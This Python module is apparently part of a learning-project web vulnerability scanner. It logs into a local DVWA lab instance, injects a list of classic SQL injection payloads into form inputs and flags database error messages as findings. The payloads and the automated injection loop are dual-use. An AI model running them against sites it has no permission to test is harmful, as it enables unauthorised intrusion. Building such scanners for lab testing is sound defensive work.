"""
Web Vulnerability Scanner - SQL Injection Detection Module
Author: Puneeth Gowda
Purpose: Reads crawler output, injects SQLi payloads into discovered inputs,
         detects database errors in responses, and reports vulnerabilities.
"""

import json
import requests
from bs4 import BeautifulSoup

# === Configuration ===
TARGET_BASE = "http://localhost:8080"
LOGIN_URL = f"{TARGET_BASE}/login.php"
USERNAME = "admin"
PASSWORD = "password"
CRAWL_INPUT_FILE = "crawl_results.json"
FINDINGS_OUTPUT_FILE = "findings.json"

# === SQLi Payloads ===
# Each payload is designed to trigger an SQL error or behavior change.
# Error-based payloads work by breaking the original query syntax.
SQLI_PAYLOADS = [
    "'",                      # Simplest - unbalanced quote
    "\"",                     # Same idea with double quote
    "' OR '1'='1",            # Classic always-true condition
    "' OR 1=1--",             # Comment-based bypass
    "' OR 'a'='a",            # Variation of always-true
    "1' AND 1=2--",           # Always-false (for blind detection)
    "' UNION SELECT NULL--",  # Union-based test
    "admin'--",               # Comment out password check
]

# === SQL Error Patterns ===
# When SQL injection succeeds, the database often leaks error messages.
# These patterns catch errors from MySQL, PostgreSQL, MSSQL, Oracle, SQLite.
SQL_ERROR_PATTERNS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch_array",
    "mysql_fetch_assoc",
    "mysql_num_rows",
    "mysqli_fetch",
    "supplied argument is not a valid mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "ora-00933",
    "ora-00921",
    "microsoft ole db provider",
    "syntax error",
    "pg_query()",
    "postgresql query failed",
    "sqlite3.operationalerror",
]


# === Helper Functions (reused from crawler) ===
def get_csrf_token(session, url):
    """Extract user_token from a DVWA page."""
    response = session.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    token_input = soup.find("input", {"name": "user_token"})
    if token_input:
        return token_input.get("value")
    return None


def login_to_dvwa():
    """Authenticate to DVWA and return an authenticated session."""
    session = requests.Session()
    token = get_csrf_token(session, LOGIN_URL)
    if not token:
        return None
    payload = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login",
        "user_token": token
    }
    response = session.post(LOGIN_URL, data=payload)
    if "Login failed" in response.text or response.url.endswith("login.php"):
        return None
    print(f"[+] Login successful")
    return session


# === Core Detection Logic ===
def detect_sql_errors(response_text):
    """Check if any SQL error pattern appears in the response."""
    response_lower = response_text.lower()
    for pattern in SQL_ERROR_PATTERNS:
        if pattern in response_lower:
            return pattern
    return None


def test_input_for_sqli(session, page_url, form, target_input):
    """
    Inject SQLi payloads into one specific input field of a form
    and check for SQL errors in the response.
    """
    findings = []

    for payload in SQLI_PAYLOADS:
        # Build form data: payload for target field, defaults for others
        form_data = {}
        for input_field in form["inputs"]:
            field_name = input_field["name"]
            if not field_name:
                continue
            if field_name == target_input["name"]:
                form_data[field_name] = payload
            else:
                form_data[field_name] = input_field.get("value", "test")

        # Submit form using its method (GET or POST)
        try:
            if form["method"] == "post":
                response = session.post(page_url, data=form_data, timeout=10)
            else:
                response = session.get(page_url, params=form_data, timeout=10)
        except requests.RequestException as e:
            print(f"        [-] Request failed: {e}")
            continue

        # Check for SQL error pattern in response
        error_found = detect_sql_errors(response.text)
        if error_found:
            finding = {
                "vulnerability": "SQL Injection (Error-based)",
                "url": page_url,
                "parameter": target_input["name"],
                "method": form["method"].upper(),
                "payload": payload,
                "evidence": error_found,
                "severity": "High",
                "cvss_score": 8.6,
            }
            findings.append(finding)
            print(f"        [!] VULNERABLE: payload '{payload}' triggered error '{error_found}'")
            return findings  # Stop on first hit per input

    return findings


def scan_page(session, page_data):
    """Test all inputs of all forms on a page for SQLi."""
    page_url = page_data["url"]
    print(f"\n[*] Testing {page_url}")
    page_findings = []

    for form in page_data["forms"]:
        for input_field in form["inputs"]:
            # Skip non-text inputs (submit/hidden buttons aren't injection targets)
            if input_field["type"] not in ["text", "search", "email", "url", "textarea"]:
                continue
            if not input_field["name"]:
                continue

            print(f"    [*] Testing input: {input_field['name']} (type: {input_field['type']})")
            findings = test_input_for_sqli(session, page_url, form, input_field)
            page_findings.extend(findings)

            if not findings:
                print(f"        [-] No SQLi indicators found")

    return page_findings


# === Main ===
if __name__ == "__main__":
    # Load crawler output
    print(f"[*] Loading crawl results from {CRAWL_INPUT_FILE}")
    try:
        with open(CRAWL_INPUT_FILE, "r") as f:
            crawl_data = json.load(f)
    except FileNotFoundError:
        print(f"[-] Could not find {CRAWL_INPUT_FILE}. Run crawler.py first.")
        exit(1)

    print(f"[+] Loaded {len(crawl_data)} pages to test")

    # Authenticate
    print(f"[*] Authenticating to DVWA...")
    session = login_to_dvwa()
    if not session:
        print("[-] Login failed. Exiting.")
        exit(1)

    # Scan each page
    all_findings = []
    for page_data in crawl_data:
        findings = scan_page(session, page_data)
        all_findings.extend(findings)

    # Save findings
    with open(FINDINGS_OUTPUT_FILE, "w") as f:
        json.dump(all_findings, f, indent=2)

    # Final report
    print(f"\n{'='*60}")
    word = 'y' if len(all_findings) == 1 else 'ies'
    print(f"[+] Scan complete!")
    print(f"[+] Found {len(all_findings)} SQL Injection vulnerabilit{word}")
    print(f"[+] Results saved to {FINDINGS_OUTPUT_FILE}")
    print(f"{'='*60}")